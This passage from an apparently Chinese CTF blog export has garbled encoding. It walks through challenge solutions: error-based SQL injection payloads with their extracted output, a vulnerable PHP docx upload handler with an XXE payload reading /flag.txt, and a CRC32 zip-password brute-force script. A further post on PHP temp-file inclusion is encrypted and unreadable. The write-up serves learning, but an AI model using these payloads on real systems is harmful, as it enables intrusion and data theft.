<p>è¿™ä¸ªteståªè¦ä¸ºä¸€ä¸ªphpä¸è®¤è¯†çš„protocolæ—¶ï¼Œphpä¼šæŠ›ä¸€ä¸ªwarningï¼Œå¹¶å°†protocolè®¾ç½®ä¸ºç©ºï¼Œåœ¨protocolä¸ºnullæˆ–è€…fileæ—¶ï¼Œåˆ™è¿›è¡Œæœ¬åœ°æ–‡ä»¶æ“ä½œã€‚</p>
<h3 id="3-SQLI"><a href="#3-SQLI" class="headerlink" title="3.SQLI"></a>3.SQLI</h3><p>RCTF2015çš„åŸé¢˜</p>
<p>æ­£å¸¸å¥—è·¯ï¼Œå…ˆfuzzä¸‹</p>
<p>ä»¥ä¸‹æ˜¯è¢«è¿‡æ»¤çš„å­—ç¬¦</p>
<p><img src="/2020/03/51ELABæ˜“éœ–åšYCTF-WP/image-20200415185646715.png" alt="image-20200415185646715"></p>
<p>æ³¨å†Œä¸€ä¸ªæ­£å¸¸çš„ç”¨æˆ·ï¼Œç™»å½•åå‘ç°å¯ä»¥ä¿®æ”¹å¯†ç ï¼Œæ€€ç–‘æ˜¯äºŒæ¬¡æ³¨å…¥</p>
<p>å°±æœ‰æ³¨å†Œ <code>sss&quot;1</code>çš„ç”¨æˆ·ï¼Œç™»é™†åè¿›å…¥ä¿®æ”¹å¯†ç çš„é¡µé¢ï¼Œå‘ç°æŠ¥é”™äº†</p>
<p><img src="/2020/03/51ELABæ˜“éœ–åšYCTF-WP/image-20200415204058693.png" alt="image-20200415204058693"></p>
<p>æ¥ç€æ„é€ payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">çˆ†è¡¨</span><br><span class="line">sss&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~article,flag,users~&apos;</span><br><span class="line"></span><br><span class="line">column</span><br><span class="line">sss&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~title,content,flag,name,pwd,ema&apos;</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">sss&quot;||updatexml(1,concat(0x7e,(select(flag)from(flag)),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~flag&#123;19de358061&#125;~&apos;</span><br></pre></td></tr></table></figure>

<h3 id="4-XXE"><a href="#4-XXE" class="headerlink" title="4.XXE"></a>4.XXE</h3><p>upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $target_file = getcwd().<span class="string">"/upload/"</span>.md5($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $target_file)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $result = @file_get_contents(<span class="string">"zip://"</span>.$target_file.<span class="string">"#docProps/core.xml"</span>);</span><br><span class="line">            $xml = <span class="keyword">new</span> SimpleXMLElement($result, LIBXML_NOENT);</span><br><span class="line">            $xml-&gt;registerXPathNamespace(<span class="string">"dc"</span>, <span class="string">"http://purl.org/dc/elements/1.1/"</span>);</span><br><span class="line">            <span class="keyword">foreach</span>($xml-&gt;xpath(<span class="string">'//dc:title'</span>) <span class="keyword">as</span> $title)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Title '"</span>.$title . <span class="string">"' has been added.&lt;br/&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $e;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"ä¸Šä¼ æ–‡ä»¶ä¸æ˜¯ä¸€ä¸ªdocxæ–‡æ¡£."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ä¸Šä¼ å¤±è´¥."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…³é”®ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result = @file_get_contents(<span class="string">"zip://"</span>.$target_file.<span class="string">"#docProps/core.xml"</span>);</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºäº†tilteï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($xml-&gt;xpath(<span class="string">'//dc:title'</span>) <span class="keyword">as</span> $title)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Title '"</span>.$title . <span class="string">"' has been added.&lt;br/&gt;"</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>payload:ä¿®æ”¹docProps/core.xmlå†…å®¹</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "/flag.txt"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cp:coreProperties</span> <span class="attr">xmlns:cp</span>=<span class="string">"http://schemas.openxmlformats.org/package/2006/metadata/core-properties"</span> <span class="attr">xmlns:dc</span>=<span class="string">"http://purl.org/dc/elements/1.1/"</span> <span class="attr">xmlns:dcterms</span>=<span class="string">"http://purl.org/dc/terms/"</span> <span class="attr">xmlns:dcmitype</span>=<span class="string">"http://purl.org/dc/dcmitype/"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span>&gt;</span></span><br><span class="line">dc:title&amp;xxe;<span class="tag">&lt;/<span class="name">dc:title</span>&gt;</span></span><br><span class="line">dc:subject<span class="tag">&lt;/<span class="name">dc:subject</span>&gt;</span></span><br><span class="line">dc:creator<span class="tag">&lt;/<span class="name">dc:creator</span>&gt;</span></span><br><span class="line">cp:keywords<span class="tag">&lt;/<span class="name">cp:keywords</span>&gt;</span></span><br><span class="line">dc:description<span class="tag">&lt;/<span class="name">dc:description</span>&gt;</span></span><br><span class="line">cp:lastModifiedBy<span class="tag">&lt;/<span class="name">cp:lastModifiedBy</span>&gt;</span></span><br><span class="line">cp:revision1<span class="tag">&lt;/<span class="name">cp:revision</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dcterms:created</span> <span class="attr">xsi:type</span>=<span class="string">"dcterms:W3CDTF"</span>&gt;</span>2015-08-01T19:00:00Z<span class="tag">&lt;/<span class="name">dcterms:created</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dcterms:modified</span> <span class="attr">xsi:type</span>=<span class="string">"dcterms:W3CDTF"</span>&gt;</span>2015-08-01T19:01:00Z<span class="tag">&lt;/<span class="name">dcterms:modified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cp:coreProperties</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¿å­˜ï¼Œä¸Šä¼ å³å¯</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="1-CRC32"><a href="#1-CRC32" class="headerlink" title="1.CRC32"></a>1.CRC32</h3><p>å‹ç¼©åŒ…ä¸­æœ‰ä¸‰ä¸ªæ–‡ä»¶å­˜æ”¾äº†è§£å‹å¯†ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc, I)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class="line">                        print(str(I) + <span class="string">":"</span> + s)</span><br><span class="line">                        <span class="keyword">global</span> flag</span><br><span class="line">                        flag = flag + s</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    f = zipfile.ZipFile(<span class="string">"CRC32.zip"</span>, <span class="string">'r'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'pass'</span>+str(i)+<span class="string">'.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        print(crc)</span><br><span class="line">        CrackCrc(crc, i)</span><br><span class="line">dic = string.printable</span><br><span class="line">CrackZip()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>   <img src="/2020/03/51ELABæ˜“éœ–åšYCTF-WP/image-20200415215316552.png" alt="image-20200415215316552">                            </p>
<p>è§£å‹å¾—åˆ°flag</p>
<h3 id="2-easyrsa"><a href="#2-easyrsa" class="headerlink" title="2.easyrsa"></a>2.easyrsa</h3><p>ç»™äº†ç§é’¥å’Œå¯†æ–‡</p>
<p><img src="/2020/03/51ELABæ˜“éœ–åšYCTF-WP/image-20200415215428837.png" alt="image-20200415215428837"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPä¸´æ—¶æ–‡ä»¶åŒ…å«getshell</title>
    <url>/2020/03/PHP%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="51cd1506fb9f5d681f818937397bba236ce1421fa73cfbb75cca9f56e3e91fcd">187b5753a5fba762a3b1e05f52211510a96177a529fb4ec8b3f2963245e4461529331e8bf665c768e64b117d0a05c81c8cbed158e86956d13733e821bf7ba07c92793510673c661cef05c2b51869be8bc1625f46e391a6e35186d317e0c05a86767d4793455f50f1da2456dfced9833122a17f77d96eb24cbe6b12413cf74f039dcf2e977ecb64483952bbe87367de9187cfb9187381460fabf47acd61a1ce8de7502c92a59188c4b3e5c5000856af05acf054b1becd45fb487a04fd2511076975d4d4fe4d8b7a284ffe74153229a94cb6597bcb0d11a5b774b8e3066394c2725f41d683be784fd080706c5a990625db69ed67d0e57046a1a0ee08d8660f77235746399516aa0efd3700dd23e09aa4632c51b2d333acab3d150f67d4ff2194fe737307056d64b8068c6f58b7ed89be0bb28ef83af69c2940eae5e6f4fd5df1f99d0bf77dd36b9bd2cc53815c2e3232d8618a91479c7e5d37d35e4817547e9d4f1ce7cc0c9e9a11c4bf2af88ff3bfda01d651d7ab97828c6f32b97f6502400c5d302057bc3753535e6ae32d08f736bfc9bb4cd4c3323ba3c036667f03c233daf229cf983a8c3e8927c52114b1c19cc94d2a8235e77d82ff8ba8395748bc48aed424e9d65cee9723efbd439534201d560d1738a135a288af1ebc6926a041283bc7158902cbd98591d9510efdd0e8323ac997ab355fd36907f4796a940c94100809fc0ae6c91b0d0025698c78399e139336998ecc7a257857175df3e7d25c6906462e716b78414dd4730b1144500935f9ecf83f348172a270f6d350bf0eaa23636b76c3ecca583370fd493bce8f348ee46430bca89c2d3064567eb2b25954280f890906e162986cc68e95af48f9cc8f4ab94526b4e574d453d09fc5786950b3cd385b1990f765dd855ad69eb6b1df5a7766b2081ff2396f6be8ed8a64bc6225ec7d1f1d82ce22a970249e853ad6f410033e4b6d8ceaec1802efd8816fbcad42eb50e29df98ececd24684d25d9ea57a46f336f3c423cd1ad21fa6b1d414b34b80f60eaaa72585a8858f8b9ca861f42c9e65d86702342f43e47a98b52d51d87beb373af164451e5dd77d25459660934dd9f66d48a60880bd37b30cb5f81dec6a38ba15c7509808ca024db0525b6a3aa18eeea544b195669b7855d2ca44127544c0bfa7d5e4cf1236e4950c80b2bb0617c9c1ab5c15afd19d73ee0cce1369347cac8c3e51d95891d9e36780c0b2e1bec45b44710f86871ea1582a9fc4d2f4304a9e9a9d4d409d4185943085460d1e15d7796d013a1720cf01f1b5bb4d9dd79e96240febf32053d62d76d60ebc779265c82fea10c59d45a9f287ac9e453691c36f807e9279c4025ad43194f5d7376c590c8fc423c4f1ab11f4bd90ce63868faee4aeb5e04251532368cfa45805f099f4df4287b812419e47afb7a7765fc0c51964e91b08828bf2fe1c0aa6f578eed270b1c66d00c19de40fd1bd111d2b6dc3590b46d4e0dacd2e93c82299ba99adec01ef179239cf6cf3f63ba61eda7b04420838c2284b9eb20cc2e73d2458cacd89c18fe7ce9958800889556446b1cb691d1719d2917c0aba58d82c1437894a223ef53a5f9ea2476ac788cb55336acdaf8094be7a34cd03ee063843879fbec7468d2951ae7e9fba46b41158bc70feb3068bfdf91544b029e11b89e7a267b3783ac0435837911a70202dc698ed2e74fb93a59f4b5d764adf77fc6e08142030e31454aebb46828accf7896f8d9c8d0c5778fea84df0936df5f1b68f52a5b86741751ba55b98f4eb376782d10422d5aad59719554fefb6f99b73cf88cb764e943ec14a412120cad47c623d28c55aa7f37111b2cbdfc4daabf74e2150ecb6e5576faf2728d86812d0579a99d3f8e2e109a45d1cfcaa84f0736a2bcb859757dc89baa9aeb6e283d90fe8b35f7271727c7402be1a6fe468bd83c78a93b15458805122775a17650c87672902a2f62a2c54d6aaf60bf353ad20fb30042734532e1c5f05ad8bf495b06ea545d96bff8b10fa5078f07445704c1a2052e990e6546e2131252a7d1b129cf55f7db227437d03532d9b32f4f9a4fe4b74f9d9d9cf5006049c5159b0faa5d6c3606d4c164f8c483009315516a656c8b50a71c4cb1dfdb3949a58323ce139ea5493b302e4eac9b88e322a4e3fbfff006e57711fbf584790fb59f8db474508750d4173e9aeef6ad521ee006b76fbd761c30a8c38bca67d72070928d6fbc703a0ac0566e469e8b78f85a45c394e0d9acc5f504c1467a83a271312e29eec34eecae1a31322727df0f54707cafff65b56fddffc22dd0e9f0d12240618a92c2b8572619f02029e2206bd168b11edd7199eb9031c0a9190929ee63c83adc936feaf1cf66da89db4f7c3be373e90720128e3d4c804983f99b4cc6ad0b347937d77f3e3c4b6841c1a5eca4ccbbfbeb853c2a87b2254fdd73205fc0aac9434cb1dd2127cf6680188fbdde0d889b63eeeef2784e33d54897e95168df377f5bfde56e997337676ea99c143427d05cfef8b36110c5b4e90b6d7f61191fe5d3aac9b9f9cdbfe844666500570a9bb24cab6c70be9ffcbf3896afd09c483e2fd7ebec8c786db4b6ea4b0008e09a4d5dfb16b054a1166ba52d2b0b2b5466f3d0e0c2e8f8ca9859277c506a477fb0f3186512c7915d258ba7973031ae4ad989314110305f404d2712d58819f8b307d52b84b14b84163f8d01a3e4c9daf3cdca9caae629818c3dc84f2f204bdbbe5c6bae57112f673cb2cf785ada0691d6666f6f5add020e749c52c214a951aef03e39b3853c417b0116284547636d7ac8fdc5777d3e378ac531302f741f46a1fc4dfef60768afef04db77304ad135b5711576ff164cd85ba2e7f12958488b9493121d03219c0d99e45f907cc8b94c6802261aceecc96e12681d1acfa03b72ac41cf8e1c65c462df88b57c3d712d43ebf3efd4c20e09f7480bb75d001387ec2042ba139e3d995e2ebcedc3f8799d27723e0d34bd5cb5fd66e56ce0859daf8ba422f4f5d908927e7cf9522a02e9faaaa79a8a25e5d9f56e5d5c58cf33fc3e429657e7cfef593b3d43936a2710ba3df0bd85242e3134acd3060fc80fb9b33f520b2101825dc305db904bcf0638de1b66d3d39e6bef9ffe7d6f3a9e408dc1abafa32004c5bce4f045bb4880199f8347a3dc825dd3b4caa82ed08f780fd245fd722dd17a44fa00629f16c8508264535cdca684876ebc3b8dbe268ca680473ba1f5fe6ddf6bec84ae5eae691828f1160941064e66bc6470b0024ecea5b4c0a65a0a8f1bdc8aa020550f903a2661976f7fc32acf2813e155101fc7398c3a35989020ca132bc4d79cb22d617790d73f5a3e57e916d340fe09f31cdd406bfb72501beddbb78814918d3ce95ba438384bbb61989441c86171c99415c781349bc4f6453520542089e5720db52d2175a9f297b30cce5f49636112ec575ec5827394fe143fbbf056aaf25a093405c692e5ff504033e06d4cbb0685267fc2fcb71883b36ad239849644f87e8c26e4bf78920f5351544b21be9883eaaf99eae6205ae759e0ed862a5e1c929a28e05ec55b4aee2c8b5df8b17794505e37f981ad3ccf222e27443348b9cf8439ff57626e5faeb6873f98e4348d995192e16e6a4649f48b5f457c9c0472b2b72ea0afbcda427055d9a8e49e07eb5b2f2dd805588b80b87487cc8ff972d26520c7d01d46616ceae707deab8caa01a1fffb7ea64a17ff878f74b95fbdbfa54187f4764b5f6965a68f7c3cf5656aa04ad73bf43cdb1825137bf4c679ecaf5213b5b66a94cb345b5378a9b72bc7f947b63b94086fd94ae6a05f1f9c303182b4125d6d78b754d9320735e69780040154c1fe37f251ad787ac9cedab5d1ebee53ea9d6ad64d378b9fb85213f251eec9990ae97436f51929469ca324be75aa6352d0aa0fd1781fe2682a9221cc663ffad20baf82d6de6e594ae2e2e61f0f8994d6560eaa0c47ef61f69b64c59ca03f31bce9d0a5ab09e5b8d10cdb2799a14890e1e8f266505802578b60e081091806548fdc55f6c9bec5c8227d27bc18a41e5b2637fa8b3a4691f9f8af09ff187fa79b2d2f97da69de48b7d9700b6b83d9981de21e1f8d6d673f5e0f857f1be2bda43eed9ef98f58e69a8d0660876cebdb8f5beebb6ffa0e9c1c2dc4c42bb85dc0498f5c492b7a20ea09d3969835a771f84602b88f865d1c0ef54a222afbf700aa6315dce5f16cbab9a758b1fdadd5b23f89bc52f88fa48e69ba0e9a87a5812e1952ed71aa89503c9401a447c2e9212c3424d755f6783e444b2375ded3cb65b888f92240e71e563a5e2c00fe407762a9555c39b260243459141906ee1ea4392d1e3f60f5fbfd7a49f4fa2b5ac054cce96ed59dd0f8a13af3997a407c0bfa13052d1ac71f543ab52e14d9293282bee7813e15b34218d475734aa1492becfb7d3b0b4ad1f81e0158a7ca9a94a0ab14223d442b9bb12fbe38849c2cb535dd00c454e01044c26a7e224a011777ead0d92ccec7dd9181b4b241df98879086c5751c2ee643428aca2d29be3a493274ca0da1f1a595b30a8d9cf9771d8542d3afa8040a0d378837712637f7c4a4731b18ac132ff86e006f061471f83858553416896971a5506d118b112d2bb47cd98483e8c544f445b580f381d63d9b6188be003db6d801a188c2c0f942f3c5a19a6a99351d7167a185e21435cb0838c9f93e54a844af89a69fe0fe4a7bc20719d1092fbaa01b4edb4877dd8db280d38f93d2388939adf2a5b531e93494ef0b7a9871d3557ceaec5d045cbc2b29a85bb49671bbdbeced94d257941d0f1b43c51d8898d6ce3df5d4538bd876e1704f81ea617f5071ddf627294f39e10fedf6ad917e7c6c727639ebf69aa5d49dd2ab44d5c65437e351b7ef389f7066d66ec84378ffbe85b61ea356b3b5b5c76f9e078b8db1d55289f13032da3d23c62377f5ac26b62c2246c2d1e91a1cc854d6e1ba764bfc94b74c71843ae7c68cce0f808c3aaa7ccebf22b5f753555f2d698a14e09215dfddc61e361bc5dd3c46670dabd534b35f224f848f0ed7a406970c14bf2be6d2eeda68a4ea22a75d046b2a5dd7254a61c7036bed8172b6ed6a5e8c7e7821486128d476fb07c0d9625f110bc82a9f5a28219a606798de0c5d78d29d9417a441147e3981b17b987f5d99da54067f5866fe4ba6923cf39045be4bd60e12459049e9c6af8041585821d0de84c69ec16879019b9ac92d1ab0f43570627e7c2225b4f5dfa9c847bc944f49fd4ef458f44332db8f6100c39152634600e45abaa58f2fcddf64eaae64abf902490c5f3fec6cb5139c47300a5215544dc7b316a73c4cfe15f5dd7cbf5cbe122efe6373a93a40f9f81747dbd50f2db71dcc8a4516430778524f4dfbdba20fce0a84ba911d53a1ffcdb5b37a05a4d2c341e01d180bd4d0ac55259e5398d4b21a4a8feb799ee391347d7bb5c61919a2d2ae1df2473e143574950613ff40cc8a4d5e8dd237803ad4202a95c757f99a214a4b56fc75acf022e8286f55fd59d59c4005a5f69878a4038942b3efb04f50511d94f8fe141dc6d97f637e20a945a391eb46382b2c135ef70e8d9ead9f57b6451870b4e720ea59f32349366c858441f5ea146cc812024c156e88db64d6cd3adf00a8953a5c605d05cf3df005c677877d574a91bfc68d38b66b19a331ed1af76fae59ad7501f2ec8833681688c60502b5b509ea079ef71d73156903041da3b8303f220699f2a465ca6c1a47bc24eb40180b3471ebc6d4a44c108bb1eea1a7299849e2bc6e3f75265ed48307535a9d2051ed3eb20d3595b3ed9e8cfb66bb40bf41648bfde0317912c5f1ba332d47a004056adf3eef1f94171fbfecdd298f339dec6f8b69ddae96eb8db2942fdeac2e4ef49231cbd0bcb29734c5b511264a49f36a8c4c7daed3a06f61ec33b6f198579ebd0d9cb81812f2bfd8820aa1a90432aa95a6261db1d59a7cd36238efcde86ca00d5934b0512a59f49ef99842066e5c0b13a0f955fe1129a799d36e91ed320d1d123f1d808b673b711d125f483af6089e0a73353143a2886383d562409f5999ca5a0125e29a5ad89f9283ea5796bb5ef98777680aa143a1d8db564b40c84ab2b3c888183bfcfb849215e2462a4aa883ea55a080ec3612496b7f543ab416435801582e4c51fdccf0a9a94258d5ccd891c0178d3b4624775322e9c6bbe00a0517ad403ddbd9bd067ed72b1428e9e56ddb9945c434e4a69de82c3d6d3d5fa1317e6daa356989c1d77b4402c3df5e71814b342ec161637c02fa6fd9de3db7e8f95ef3f8a50b09952f1fb87ecc5d6722bfa7f21bc262643bfbe925c79b5a2271058d23806eccc85534f40c22e95bc83603c640f978e394c8d0202c0d91d35dc0fd5abb6721f75e38e696d75d4acd1e272d105f533e66126e5728ed837b50ae20b54c5c355393c114cae104f12967f8d4efe47e64cb702188a370d39ccdfc42f68f0110cd897d7500b17aee66cf3059de15913107034fb83d0b0ff213a44cfff59a0d11d7645303f7e9e1ef858cc392c5739c95a63c3a5076834f26b50edfe1b0bfbd6a5d75ec0397509fed2a618472cefb0022589eecda7c390c6276498d92bf5b6bbc575e1c6e98843b6f115612615e946eba32446aacfbfd0e3e54dc4c165ee8332ca4fdbe6cdf22e5347c8bd3f241c1a47439d32ce1be2bf8701314bb5addcdef837a990a35597fef0487ca77ac88ca4902c38d49a43973eea399f53713cd1cd201e373779feaec827279cc1de96cddca787c7d55306752b484558d2fb23eecce67c8a7b4f01492fb5a137878964fc3eae2d6f5c0bb92c35f3ef1e6f7d521e7b7c7b46dc0201aa1c787db2de8959701bbcb187e8c816208ed617429101d5ab098907a6764e68aded5a1515f4356ab45605d1a778bd48276f18b407a1d3fc8063a6d7ee393d6a4cc2b0012d4bcd333ba2d6f0477d7dee030b1e75d28e36b6980659aa4307ee444ebb3f5e85efd0192093dba1c57f0210a59a158b8db0dc9d663c269784cd31fc6da0f3a100feaea2014726ee52195b75ded9ea0f9dc064c8d34d8a54553dfe6b31c24f725804e4bbe8be8e427a9c287811a734f039456c51d377cd693b20c33f6cbe9aa27f519ed0716d7674e4ac9beef85bc03484b07327eca1aa11d65435aff7e86f4c1e9acf3c3e9444dd68dbfd2af353cc75b27a975ee48030f8d9c3f83f29881bb08b4cd9cd9c50524a8cfbb682459fa011f60550944ec7deb78dd696d1cf5d23047fc428a9f09f68f5c0186e939996145f6c42c75998a554507392afb4d533c69927290fd4bb5aaedff6439aea92f2c93671b4ce832614b95bc0afc91ceee18895ddf8649d796355d3f3c23052dec4a5aea0cbf40b3b7ffa28cac31e7b8f940239539ad37a914d02e74dadbc321a3fa89fbcbc27c3abd58e60d818cb6db57ee6eacd76c4377d92d356b8b18a7aa500dbc3e954df94bf0c29c711a9c9789fa79316939999ec7f1786cd47066d127ad8aff4735bbf5461dda8d3a3ea49eef03230f372ae88660b1813468d4a9e0ccd9f4dc5411ac531fdd895d6ba837e4121cae4f4f5a129d800a07775121d209ff516d371737403a052ad63b239e11b07f4fc2522c4c32cc9ed08dfa904093ec376619c6b6076051586c1aadb098e0a4df0eeff4bf0f419faf80875988a77b49e2b6483c1fef9baa4fc6d5e1a90dc246830b04a2ba2762560c5aeaca63629dcec85ca7cc86b4c9b7b7cc609ddad7c72e0576c3942fc05b441e386986412ef9f8bd8a088d33706b94363d85e5603e776ad5e0cbec8e991ed139c28b9d7fa121d439a54d489d892de2890a660bfced35040afb201d30decace3b31c7cbc740e359197a759514962d3a66d4c205f1795f278535b86266a314640d603b51c6d1630df493bb2ddb6ec7b2a4ee9eaa8a1cce4e4dfee4894736277739489f1572aed6ae6ae2641ae066f136bb66356b97c85b4f44ce02387eb0029e61541f64a7f7d5c6bdd6ffedc3f79df554dfbdeac028f050f09f58c06bc882af8a4947019765d1e4473b0b31a63810a7f40342df3fb2e31687ff1ad4377289f37075548d460e37d0d7517401971b654fe4b81ef94b7178647738c8dec4fe3a5e0467dd7d775d5e350134768459ae13d6795b7d46591f1683295da7b6f4c8b3da7e6eb6a01cfbf64bf86da7f8828a1ae7d17c821533d1a271e5c92dcc040bd7466e181e27e028f07493fa546de419bfe6f47a14fb0373f133a07257259393043bd46b6021bbcc9445385696492f56ebc2efcc2484f8210a1a46ad56374b7c95dd7c3092b588b9aab54125768ea7681f431b42bd37e5e91a3f198478848f63c3c32afcd31ba03fbb41af86d095bbdc3fc636fa32740486c53099ba551f1b2f3282eb992baf5ea762e5905d36f904e466ce900f2c7e5c2e132aed5b5ad02b38350f68a4f50e77798394642f9f677b8e072a920a6ea35dfa59f1c3a0f4d698fe1e54a1d4bfad7a56138ef0867cd973698268328cdc87b95169e435ccfec6185edfabba18494ccbd895381335390c0a08e43a6787e8ce1838ba89e2dd6a8797dc90624d77f8efeefb44f99f42fd9082ecbb6b422a5cdeb62309b9974dfe4b5b0a0bdba488aec70fe19839df8c35c83ba432bb5bde0b3dd299dd2dfe852f37d9c3b554eb609ef0f97b5419707bb4dace0a649bb0387bda0bb8d86a6c5cd28f844fba1c6b2bacaed7a457c0e7611144339b724adace3ae9db3eed588af4bc6a2880e7e16445e6629a3736a137421e8afffbc55406419deab67541e57afab7e637e2cc693c81a9d6b671f5d48289c3d440bce69939f54a22b873f1036e4062ac7f9bbf8a8a2b9514fb836069380c717641e1b07148c57ec70f0cd410c7d5bf25726c64ed24e39783ea36167a522ef725c987a5cada2ef088fc99d33ab724d236b4b5d4163a0cb75cce4db855a8004bd0ad3c7f0cd539617da51ec78efa8fa2b39d489d18c069326e91ea38a40f0f0e90d3ef43397d0331ee649cb7892bd4025216163061c5983744a79a9554de2154d49297f24979ef2b673b0541d9c2534cba76612e6fb34c21c0381fd17679119a2aa85ca3a99aeda697a683ee669c8b9d84c9d56912ef4f0e1229b22ac795bf6e0326c834c4ce2ad8dd28672d8406c5d2e114bd2f3410a31bc2913c515b0ce38063614df9ce75c2306dfcf26435e1812225b9b1415db24e482ebfd8a1222660539d7bf1e0796c6f77812f64a733e031c775cb8b327d18cd2ca711b2994d95562601a5e3cb13a8b530fecd4f46b2cb2e503e255e1fbb5b7cb7ed49f50917972558d63cf69e8ff03f13bcaae9491f0ea4bba41a01d241ccc299c23d8cb1f57642fe2e30357bf96a271fad71b2f6ef527d7c4cfa8459cfde1a47efbfb0da7842e67412b597b6dda5d3bb41b51c4b7f49eac69f70876018140a54cc5e131fc965725fe052f20b13e3d27be3a21b0fd4e536617540bb232268603cba26f13ee2bba362920c04a19242e09fa16fe4c167fa7537346d8c8703a480dd3f3f88e0798d46193f0ac3ba9e9a7b2ed198414a61dc4c37d28dc9762c7228f498bcf9ec10089a9f87b2ab99bfb803e65368945f8441ef88183cae70645c75af75fe90b5f9de756dc0a5b3632af6f5bc0ebb8547873fc602cbec3825105543138744a41d5eb6c5d14c8e2d9749f14b0ae95edcc8e98a7cf12fd5844c5c54fef0bceed234708f2151c7285f60616da9b74dbb867a734da4cefe81ac60eaaf0182ff707ccaea1816782c919169b115042225848bc0ea70e3008774c193e21d3b584a4b8c6c582aba9b9af24e50fb0a31001208c43401c9946297f2cbd63504b15283ba95c0a95c841a2f30915e01f9c1af3cd6d4a4461a13f5acaa731efe996ac7f348ad82c619ac65c393b1d6bc0c956b7c7fe8267256b274f7bfea299174f6a6cd556d7ab85d4bf64511b7b7338bb1612c405f3e830bf4cdf9da32432037efd3efa8ee43a5d7dcab4dea14370cb2ed62a482adc3bdabcb1886cd1e80c84ac71f44b4cbfedc1a7da45383d6f9fbc6b9feabbecaf9a91defb3ce09fe67aa90e91d033be47ae20188dd113761862961bd050d6a2d4d3325544c5389a39e29691b3b3acbfb7f19f20665884e23919aece23a4e6a6b3881284f3a20baa25522da3b347d7e8a8b7000ce0d8fd62be